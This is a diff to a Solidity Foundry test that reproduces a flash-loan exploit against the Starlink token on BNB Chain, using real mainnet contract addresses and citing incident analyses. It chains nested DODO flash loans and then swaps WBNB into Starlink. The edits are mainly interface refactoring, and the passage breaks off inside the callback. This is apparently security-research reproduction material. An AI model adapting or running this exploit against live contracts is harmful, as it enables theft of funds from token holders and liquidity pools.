@@ -3,6 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/NumenAlert/status/1626447469361102850
 // https://twitter.com/bbbb/status/1626392605264351235
@@ -13,7 +18,7 @@ contract ContractTest is Test {
 
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 Starlink = IERC20(0x518281F34dbf5B76e6cdd3908a6972E8EC49e345);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Pair Pair = IUniswapV2Pair(0x425444dA1410940CFdfB6A980Bd16aA7a5376d6D);
     address dodo1 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
     address dodo2 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
@@ -28,7 +33,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         dodoFlashAmount1 = WBNB.balanceOf(dodo1);
-        DVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));
+        IDVM(dodo1).flashLoan(dodoFlashAmount1, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
@@ -36,11 +41,11 @@ contract ContractTest is Test {
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         if (msg.sender == dodo1) {
             dodoFlashAmount2 = WBNB.balanceOf(dodo2);
-            DVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));
+            IDVM(dodo2).flashLoan(dodoFlashAmount2, 0, address(this), new bytes(1));
             WBNB.transfer(dodo1, dodoFlashAmount1);
         } else if (msg.sender == dodo2) {
             dodoFlashAmount3 = WBNB.balanceOf(dodo3);
-            DVM(dodo3).flashLoan(dodoFlashAmount3, 0, address(this), new bytes(1));
+            IDVM(dodo3).flashLoan(dodoFlashAmount3, 0, address(this), new bytes(1));
             WBNB.transfer(dodo2, dodoFlashAmount2);
         } else if (msg.sender == dodo3) {
             WBNBToStarlink();
